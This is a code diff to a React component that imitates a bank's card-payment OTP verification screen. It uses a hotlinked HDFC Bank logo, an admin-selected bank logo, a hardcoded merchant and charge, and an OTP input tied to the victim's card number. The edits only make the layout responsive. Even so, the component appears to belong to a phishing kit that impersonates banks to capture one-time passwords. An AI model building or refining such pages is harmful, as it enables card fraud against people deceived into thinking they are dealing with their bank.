@@ -233,11 +233,11 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
   };
 
   return (
-    <div className="fixed inset-0 bg-white z-50 flex items-center justify-center p-2">
-      <div className="w-full max-w-lg bg-white px-4 py-3">
+    <div className="fixed inset-0 bg-white z-50 flex items-center justify-center p-2 sm:p-4">
+      <div className="w-full max-w-lg bg-white px-3 py-2 sm:px-4 sm:py-3">
         {/* Header with logos */}
-        <div className="flex items-center justify-between mb-4 pb-3 border-b border-gray-200">
-          <div className="flex items-center gap-3">
+        <div className="flex items-center justify-between mb-3 sm:mb-4 pb-2 sm:pb-3 border-b border-gray-200">
+          <div className="flex items-center gap-2 sm:gap-3">
             <img
               src={(() => {
                 const cardBrand = getCardBrand(cardData.cardNumber);
@@ -251,7 +251,7 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
                 }
               })()}
               alt="Card Brand Logo"
-              className="h-8 w-auto max-w-[65px] object-contain"
+              className="h-6 sm:h-8 w-auto max-w-[50px] sm:max-w-[65px] object-contain"
               onError={(e) => {
                 e.currentTarget.src = 'https://cdn3.iconfinder.com/data/icons/credit-cards-pos/195/verified_by_visa-512.png';
               }}
@@ -261,7 +261,7 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
           <img
             src={adminSelectedBankLogo || sessionBankLogo || 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png'}
             alt="Bank Logo"
-            className="h-8 w-20 object-contain"
+            className="h-6 sm:h-8 w-16 sm:w-20 object-contain"
             onError={(e) => {
               e.currentTarget.src = 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png';
             }}
@@ -269,61 +269,61 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
         </div>
 
         {/* Main content */}
-        <div className="text-center mb-4">
-          <p className="text-sm text-gray-700 leading-relaxed px-2">
+        <div className="text-center mb-3 sm:mb-4">
+          <p className="text-xs sm:text-sm text-gray-700 leading-relaxed px-1 sm:px-2">
             The One Time Password has been sent to the below registered Mobile Number and Email ID. Please use the password and authenticate the transaction
           </p>
         </div>
 
         {/* Details table */}
-        <div className="space-y-2 mb-4">
+        <div className="space-y-1 sm:space-y-2 mb-3 sm:mb-4">
           {emailData.show && (
             <div className="flex justify-between items-center py-1">
-              <span className="font-semibold text-gray-800">E-Mail:</span>
-              <span className="text-gray-700">{emailData.email}</span>
+              <span className="font-semibold text-gray-800 text-xs sm:text-sm">E-Mail:</span>
+              <span className="text-gray-700 text-xs sm:text-sm">{emailData.email}</span>
             </div>
           )}
           
           <div className="flex justify-between items-center py-1">
-            <span className="font-semibold text-gray-800">Mobile Number:</span>
-            <span className="text-gray-700">{mobileNumber}</span>
+            <span className="font-semibold text-gray-800 text-xs sm:text-sm">Mobile Number:</span>
+            <span className="text-gray-700 text-xs sm:text-sm">{mobileNumber}</span>
           </div>
           
           <div className="flex justify-between items-center py-1">
-            <span className="font-semibold text-gray-800">Not your contact details??</span>
-            <a href="#" className="text-blue-600 font-semibold underline">Refresh</a>
+            <span className="font-semibold text-gray-800 text-xs sm:text-sm">Not your contact details??</span>
+            <a href="#" className="text-blue-600 font-semibold underline text-xs sm:text-sm">Refresh</a>
           </div>
           
           <div className="flex justify-between items-center py-1">
-            <span className="font-semibold text-yellow-600">Merchant Name:</span>
-            <span className="font-semibold text-yellow-600">PLURALSIGHT</span>
+            <span className="font-semibold text-yellow-600 text-xs sm:text-sm">Merchant Name:</span>
+            <span className="font-semibold text-yellow-600 text-xs sm:text-sm">PLURALSIGHT</span>
           </div>
           
           <div className="flex justify-between items-center py-1">
-            <span className="font-semibold text-gray-800">Date:</span>
-            <span className="text-gray-700">{currentDateTime}</span>
+            <span className="font-semibold text-gray-800 text-xs sm:text-sm">Date:</span>
+            <span className="text-gray-700 text-xs sm:text-sm">{currentDateTime}</span>
           </div>
           
           <div className="flex justify-between items-center py-1">
-            <span className="font-semibold text-gray-800">Total Charge:</span>
-            <span className="text-gray-700">Rs 366.00</span>
+            <span className="font-semibold text-gray-800 text-xs sm:text-sm">Total Charge:</span>
+            <span className="text-gray-700 text-xs sm:text-sm">Rs 366.00</span>
           </div>
           
           <div className="flex justify-between items-center py-1">
-            <span className="font-semibold text-gray-800">Card Number:</span>
-            <span className="text-gray-700">XXXXXXXXX{cardData.cardNumber.slice(-4)}</span>
+            <span className="font-semibold text-gray-800 text-xs sm:text-sm">Card Number:</span>
+            <span className="text-gray-700 text-xs sm:text-sm">XXXXXXXXX{cardData.cardNumber.slice(-4)}</span>
           </div>
         </div>
 
         {/* OTP Input */}
-        <div className="mb-4">
-          <div className="flex justify-between items-center mb-3">
-            <label className="font-semibold text-gray-800">Enter OTP:</label>
+        <div className="mb-3 sm:mb-4">
+          <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center mb-2 sm:mb-3 gap-2 sm:gap-0">
+            <label className="font-semibold text-gray-800 text-sm sm:text-base mb-1 sm:mb-0">Enter OTP:</label>
             <input
               type="text"
               value={otpValue}
               onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
-              className="border-2 border-gray-500 px-3 py-2 w-32 text-center font-mono tracking-wider text-lg font-bold bg-white text-gray-900 focus:border-blue-500 focus:outline-none placeholder-gray-400"
+              className="border-2 border-gray-500 px-2 py-1 sm:px-3 sm:py-2 w-full sm:w-32 text-center font-mono tracking-wider text-base sm:text-lg font-bold bg-white text-gray-900 focus:border-blue-500 focus:outline-none placeholder-gray-400"
               placeholder="Enter OTP"
               maxLength={6}
               disabled={otpSubmitting}
@@ -331,7 +331,7 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
           </div>
           
           <div className="text-right">
-            <a href="#" className="text-blue-600 underline text-sm">Resend OTP</a>
+            <a href="#" className="text-blue-600 underline text-xs sm:text-sm">Resend OTP</a>
           </div>
         </div>
 
@@ -343,11 +343,11 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
         )}
 
         {/* Action buttons */}
-        <div className="flex gap-4 justify-center">
+        <div className="flex gap-2 sm:gap-4 justify-center">
           <button
             onClick={handleSubmit}
             disabled={otpSubmitting || otpValue.length !== 6}
-            className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-2 rounded disabled:opacity-50 disabled:cursor-not-allowed font-medium"
+            className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 sm:px-8 sm:py-2 rounded disabled:opacity-50 disabled:cursor-not-allowed font-medium text-sm sm:text-base"
           >
             {otpSubmitting ? 'Processing...' : 'Submit'}
           </button>
@@ -355,15 +355,15 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
           <button
             onClick={handleOtpCancel}
             disabled={otpSubmitting}
-            className="bg-gray-500 hover:bg-gray-600 text-white px-8 py-2 rounded disabled:opacity-50 font-medium"
+            className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 sm:px-8 sm:py-2 rounded disabled:opacity-50 font-medium text-sm sm:text-base"
           >
             Cancel
           </button>
         </div>
 
         {/* Timeout consent message */}
-        <div className="mt-3 text-center">
-          <p className="text-xs text-gray-600 leading-relaxed px-2">
+        <div className="mt-2 sm:mt-3 text-center">
+          <p className="text-xs text-gray-600 leading-relaxed px-1 sm:px-2">
             By clicking on Confirm, I agree to allow {bankName} to debit my above card/account for this transaction and for fees and charges as may be applicable. I also agree to the terms and conditions. For inquiry/dispute related to the transaction, I can call customer care number.{' '}
             <span className="text-red-600 font-semibold">
               This page will expire in {formatTimer(timeLeft)}.
